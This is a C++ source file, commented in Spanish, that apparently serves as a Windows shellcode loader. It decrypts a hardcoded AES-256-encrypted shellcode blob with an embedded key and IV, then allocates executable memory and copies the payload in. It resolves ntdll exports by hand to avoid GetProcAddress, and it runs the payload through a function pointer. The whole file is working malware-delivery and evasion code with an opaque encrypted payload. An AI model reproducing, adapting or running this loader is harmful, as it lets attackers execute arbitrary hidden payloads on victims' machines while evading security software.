#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <cstring>

// Shellcode cifrado con AES-256
unsigned char encryptedShellcode[] = {
    0x50,0x19,0x06,0x8d,0xf4,0x47,0x94,0xff,0x6e,0x78,0xb0,0xa3,
    0x3e,0x6d,0xdb,0x81,0xd3,0x2c,0xdf,0xb2,0xd3,0xd1,0x32,0xbc,
    0x8a,0x2e,0x48,0x64,0x75,0x0f,0x44,0xc5,0xc9,0xf6,0x40,0x37,
    0xd6,0xfe,0x0f,0x91,0x92,0xed,0xbb,0xcb,0x18,0xcf,0x44,0x71,
    0xe7,0x6d,0x6d,0xe6,0xcc,0xaa,0xbf,0xce,0x9a,0x5f,0xd8,0x8a,
    0xd7,0x96,0xbe,0x20,0x39,0x6c,0x96,0xf8,0x23,0x65,0x12,0x04,
    0x3e,0x79,0x37,0xb8,0xb1,0x2b,0x2b,0x7f,0x65,0x0d,0x2d,0xea,
    0xe4,0xc7,0xef,0x0f,0x0a,0x51,0x0a,0x20,0xbd,0x6c,0xdd,0xea,
    0x48,0xdd,0xf1,0xbe,0x88,0x89,0x97,0xeb,0xd3,0x10,0x56,0xf5,
    0x33,0x0f,0x9f,0x00,0xf8,0x97,0x56,0x91,0x08,0x11,0x41,0x26,
    0x4c,0x4e,0x51,0xb5,0xa0,0xb6,0x70,0x44,0x13,0x12,0x52,0xac,
    0xb5,0x54,0x8f,0xb6,0xd3,0x7a,0x2e,0xc6,0x37,0x56,0x37,0xe6,
    0xf0,0x0a,0x2f,0x2e,0x38,0x19,0xa3,0x5a,0x4c,0x4d,0x89,0xa9,
    0x99,0x9b,0x80,0x9e,0x04,0x8f,0xb6,0x33,0x13,0xee,0xf7,0x20,
    0xa3,0x05,0x52,0x65,0x4b,0x3e,0xf7,0xb4,0xb9,0xce,0xb8,0x47,
    0x2a,0x0a,0x11,0x8a,0x13,0x34,0xe4,0x84,0x5e,0xed,0x99,0x1b,
    0x64,0x0c,0x0c,0x12,0x11,0xe9,0xda,0xab,0xc7,0x5e,0x59,0x48,
    0x9e,0x59,0x36,0x36,0xe9,0x48,0x62,0x49,0xea,0x0f,0x6d,0x7c,
    0x59,0xa4,0xca,0x30,0x43,0xc7,0x42,0xb2,0x43,0x0e,0x6c,0x31,
    0xe5,0x51,0x49,0x38,0x0d,0x55,0x64,0x23,0x61,0xc7,0xd6,0x9f,
    0x33,0x04,0x99,0x49,0x40,0x05,0x89,0xab,0xd9,0xd6,0x10,0xc0,
    0xcf,0xfb,0x6b,0x97,0x91,0x62,0x30,0x8e,0xe1,0x44,0x7d,0xb5,
    0xee,0x30,0x2e,0xd4,0x90,0x7b,0x4f,0xcd,0xa7,0xb0,0x1b,0xf6,
    0xe1,0x48,0xf7,0x81,0xe1,0x8e,0x38,0x90,0x8d,0x6f,0x6c,0x58,
    0x7e,0x11,0x2e,0xc9,0x1d,0x6d,0x2a,0x45,0x01,0xd6,0x6c,0x15,
    0xbd,0x1b,0x7a,0x11,
};

// Clave AES real (32 bytes)
unsigned char key[] = {
    0x3c,0x2c,0x14,0xc6,0xe3,0x7e,0xfa,0x07,0xcc,0x46,0x3d,0x8a,
    0xe0,0x53,0x41,0xbd,0x65,0xa4,0x04,0xe4,0xf5,0xc8,0x05,0x46,
    0x7b,0x90,0xdb,0x41,0x2e,0xdb,0x4c,0x1f,
};

// Vector de inicialización (IV) real (16 bytes)
unsigned char iv[] = {
    0xba,0x72,0xa4,0xda,0xf7,0xb2,0x8a,0x9c,0x4d,0x26,0x73,0x1b,
    0xec,0xcc,0x43,0x42,
};

DWORD shellcodeSize = sizeof(encryptedShellcode);

// Obtener dirección de función desde NTDLL sin usar GetProcAddress
FARPROC GetNativeProcAddress(LPCSTR functionName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return NULL;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdll + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)ntdll +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD functions = (PDWORD)((DWORD_PTR)ntdll + exportDirectory->AddressOfFunctions);
    PDWORD names = (PDWORD)((DWORD_PTR)ntdll + exportDirectory->AddressOfNames);
    PWORD ordinals = (PWORD)((DWORD_PTR)ntdll + exportDirectory->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        LPCSTR currentName = (LPCSTR)((DWORD_PTR)ntdll + names[i]);
        if (strcmp(functionName, currentName) == 0) {
            return (FARPROC)((DWORD_PTR)ntdll + functions[ordinals[i]]);
        }
    }
    return NULL;
}

// Syscall stub para NtAllocateVirtualMemory (Windows 10/11) - Compatible con GCC
EXTERN_C NTSTATUS NtAllocateVirtualMemorySyscall(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect) {
    
    // Usar VirtualAlloc directamente como alternativa
    *BaseAddress = VirtualAlloc(NULL, *RegionSize, AllocationType, Protect);
    if (*BaseAddress == NULL) {
        return GetLastError();
    }
    return 0; // STATUS_SUCCESS
}

// Descifrado con CryptoAPI
BOOL DecryptShellcode() {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    BOOL success = FALSE;
    
    // 1. Adquirir contexto criptográfico
    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        std::cerr << "CryptAcquireContext failed: " << GetLastError() << std::endl;
        return FALSE;
    }

    // 2. Crear estructura de blob para la clave
    struct {
        BLOBHEADER hdr;
        DWORD dwKeySize;
        BYTE rgbKeyData[32];
    } keyBlob;

    // 3. Configurar encabezado del blob
    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_256;
    
    // 4. Configurar tamaño de la clave
    keyBlob.dwKeySize = 32;
    
    // 5. Copiar la clave real
    memcpy(keyBlob.rgbKeyData, key, 32);

    // 6. Importar la clave
    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
        std::cerr << "CryptImportKey failed: " << GetLastError() << std::endl;
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    // 7. Configurar modo CBC
    DWORD dwMode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0)) {
        std::cerr << "CryptSetKeyParam(KP_MODE) failed: " << GetLastError() << std::endl;
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    // 8. Configurar IV
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        std::cerr << "CryptSetKeyParam(KP_IV) failed: " << GetLastError() << std::endl;
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    // 9. Descifrar el shellcode
    DWORD decryptedSize = shellcodeSize;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, encryptedShellcode, &decryptedSize)) {
        std::cerr << "CryptDecrypt failed: " << GetLastError() << std::endl;
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    // Actualizar el tamaño del shellcode descifrado
    shellcodeSize = decryptedSize;

    // 10. Limpiar recursos
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    
    return TRUE;
}

int main() {
    std::cout << "Iniciando descifrado..." << std::endl;
    
    // 1. Descifrar shellcode
    if (!DecryptShellcode()) {
        std::cerr << "Error en el descifrado" << std::endl;
        return 1;
    }
    std::cout << "Descifrado completado. Tamaño: " << shellcodeSize << " bytes" << std::endl;

    // 2. Asignar memoria ejecutable
    LPVOID memory = NULL;
    SIZE_T size = shellcodeSize;
    SIZE_T pageSize = 4096;
    SIZE_T adjustSize = (size + pageSize - 1) & ~(pageSize - 1);

    std::cout << "Tamaño original: " << size << ", ajustado: " << adjustSize << std::endl;

    NTSTATUS status = NtAllocateVirtualMemorySyscall(
        GetCurrentProcess(),
        &memory,
        0,
        &adjustSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (status != 0) {
        std::cerr << "Error al asignar memoria con syscall: " << status << "(0x" << std::hex << status << std::dec << ")" << std::endl;
        std::cout << "Intentando con VirtualAlloc.." << std::endl;
        memory = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!memory){
            std::cerr << "Error al asignar memoria con VirtualAlloc:" << GetLastError() << std::endl;
            return 1;
        }
        std::cout << "Memoria asignada con VirtualAlloc en: " << memory << std::endl;
    } else {
        std::cout << "Memoria asignada con syscall en: " << memory << std::endl;
    }
    std::cout << "Memoria asignada en: " << memory << std::endl;

    // 3. Copiar shellcode descifrado
    memcpy(memory, encryptedShellcode, shellcodeSize);
    std::cout << "Shellcode copiado a memoria" << std::endl;

    // 4. Cambiar permisos a ejecución/lectura
    DWORD oldProtect;
    if (!VirtualProtect(memory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Error al cambiar permisos: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "Permisos cambiados a PAGE_EXECUTE_READ" << std::endl;

    // 5. Ejecutar shellcode
    std::cout << "Ejecutando shellcode..." << std::endl;
    ((void(*)())memory)();

    std::cout << "Ejecución completada" << std::endl;
    return 0;
}